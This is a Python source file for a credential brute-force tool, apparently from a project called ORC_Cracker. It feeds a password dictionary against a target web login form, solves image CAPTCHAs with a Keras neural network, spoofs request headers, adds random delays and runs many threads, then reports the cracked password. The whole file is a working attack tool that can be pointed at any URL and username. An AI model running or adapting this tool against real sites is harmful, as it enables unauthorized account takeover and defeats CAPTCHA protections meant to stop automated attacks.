#!/bin/python
import argparse
parser = argparse.ArgumentParser(description="using AI model to brute crack password.Github: https://github.com/Pieyue/ORC_Cracker")
parser.add_argument('-l', '--url', action='store', required=True, help='Target URL.')
parser.add_argument('-u', '--user-name', action='store', required=True, help='set username')
parser.add_argument('-p', '--passwd', action='store', required=True, help='select password dict')
parser.add_argument('-v', '--verbose', action='store_true', help='open verbose mode.')
parser.add_argument('-t', '--threads', type=int, default=10, action='store', help="设置线程数量，默认为10")
parser.add_argument('-m', '--model', action='store', default='./model/CNN_RNN_0073.keras', help="选择使用的模型")
args = parser.parse_args()

import os
import time
import random
import threading
import queue
import requests
from bs4 import BeautifulSoup
import tensorflow as tf
from tensorflow.keras.models import Model
from colorama import Fore

from fake_header import generate_headers

class Cracker:
    def __init__(
            self,
            target: str,
            model: str,
            threads: int,
            user_name: str | None = None,
            password_dict: str | None = None,
            verbose: bool = None,
    ):
        self.TARGET: str = target
        self.MODEL: Model = tf.keras.models.load_model(model)
        self.USERNAME: str = user_name
        self.PASSWD_DICT: str = password_dict
        self.VERBOSE: bool = verbose
        self.THREADS: int = threads
        self.DOMAIN: str = f"http://{target.split('/')[2]}"

        self.success = threading.Event()    # 全局事件标志
        self.PASS_QUEUE = queue.Queue()
        with open(self.PASSWD_DICT, 'r', encoding='utf-8') as f:
            for password in f:
                self.PASS_QUEUE.put(password.strip())
        self.TRUE_PASSWORD = None

    def view_target_site(self):
        header = generate_headers()
        return requests.get(self.TARGET, headers=header), header

    def save_captcha(self, page: str, header: dict):
        soup = BeautifulSoup(page, 'lxml')
        captcha_url = soup.find('img', id='captcha')['src']
        captcha = requests.get(f'{self.DOMAIN}/{captcha_url}', headers=header)
        captcha_name = captcha_url.split('/')[-1]

        with open(f'./captcha/{captcha_name}', 'wb') as f:
            f.write(captcha.content)

        return captcha_name

    def load_and_preprocess(self, captcha_name):
        # 将图像路径转换为tensor
        captcha_path = tf.strings.join(['./captcha/', captcha_name])

        # 使用TensorFlow原生的图像加载和预处理
        captcha_image = tf.io.read_file(captcha_path)
        captcha_image = tf.image.decode_png(captcha_image, channels=3)
        captcha_image = tf.image.convert_image_dtype(captcha_image, tf.float32)  # uint8->float32，自动标准化到[0,1]
        captcha_image = tf.image.resize(captcha_image, (60, 160))
        captcha_image = tf.expand_dims(captcha_image, axis=0)

        return captcha_image

    def predict_captcha(self, captcha_image):
        prediction = self.MODEL.predict(captcha_image, verbose=0)
        pred_char = ''
        for pred in prediction:
            for j in range(4):
                char_idx = tf.argmax(pred[j]).numpy()
                if char_idx < 10:
                    pred_char += str(char_idx)
                elif char_idx < 36:
                    pred_char += chr(ord('a') + char_idx - 10)
                else:
                    pred_char += chr(ord('A') + char_idx - 36)
        return pred_char

    def send_payload(self, username, password, captcha, header):
        if self.VERBOSE:
            print(Fore.RED, '[-] Trying:', password)
        try:
            response = requests.post(self.TARGET, {'username':username, 'password':password, 'captcha': captcha}, headers=header, timeout=5)
            soup = BeautifulSoup(response.text, 'lxml')
            if soup.find('h1').text == f'你好，{username}':
                self.success.set()
                self.TRUE_PASSWORD = password
                return True
        except Exception:
                error_text = soup.find('p', class_='error').text
                if error_text == '用户名或密码错误':
                    return False
                else:
                    if self.VERBOSE:
                        print(' [-] Fail to orc, retrying...')
                    time.sleep(random.uniform(0.1, 0.5))
                    page, header = self.view_target_site()
                    session = page.headers.get('Set-Cookie')
                    header['Cookie'] = session
                    time.sleep(random.uniform(0.1, 0.5))
                    captcha_name = self.save_captcha(page.text, header)
                    captcha_image = self.load_and_preprocess(captcha_name)
                    captcha = self.predict_captcha(captcha_image)
                    time.sleep(random.uniform(0.1, 0.5))
                    self.send_payload(username, password, captcha, header)

    def attack(self, username):
        while not self.success.is_set():
            time.sleep(random.uniform(0.1, 0.5))
            try:
                password = self.PASS_QUEUE.get(timeout=1)    # 从队列中获取密码
            except queue.Empty: # 如果在一秒内无法获取不到密码，说明密码已跑完，退出线程
                break
            if password is None:
                break
            if self.success.is_set():
                break
            try:
                page, header = self.view_target_site()
                session = page.headers.get('Set-Cookie').split(';')[0]
                header['Cookie'] = session
                time.sleep(random.uniform(0.1, 0.5))
                captcha_name = self.save_captcha(page.text, header=header)
                captcha_image = self.load_and_preprocess(captcha_name)
                predict = self.predict_captcha(captcha_image)
                if self.VERBOSE:
                    print(Fore.GREEN, f'captcha: {captcha_name}, predict: {predict}')
                time.sleep(random.uniform(0.1, 0.5))
                self.send_payload(username, password, predict, header)
            except Exception as e:
                print(Fore.RED, f'[-] Error: {e}')
            finally:
                self.PASS_QUEUE.task_done() # 标记任务完成

    def run(self):
        threads = []
        for _ in range(self.THREADS):
            thread = threading.Thread(target=self.attack, args=(self.USERNAME,), daemon=True)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

if __name__ == '__main__':
    target = args.url
    username = args.user_name
    password_dict = args.passwd
    model = args.model
    threads = args.threads
    verbose = args.verbose
    print(f'target: {target}, username: {username}, password_dict: {password_dict}')
    print(f'model: {model}, threads: {threads}, verbose: {verbose}')
    cracker = Cracker(target=target, model=model, threads=threads, user_name=username, password_dict=password_dict,
                      verbose=verbose)
    cracker.run()
    if cracker.TRUE_PASSWORD is not None:
        print(Fore.LIGHTGREEN_EX, f'[+] Success! The username is {username}, password: {cracker.TRUE_PASSWORD}')
    else:
        print(Fore.LIGHTRED_EX, '[-] Not found password')
    print(Fore.RESET)
    print('Cleaning...')
    captcha_dir = os.path.join(os.getcwd(), 'captcha')
    captchas = os.listdir(captcha_dir)
    for captcha in captchas:
        os.remove(os.path.join(captcha_dir, captcha))
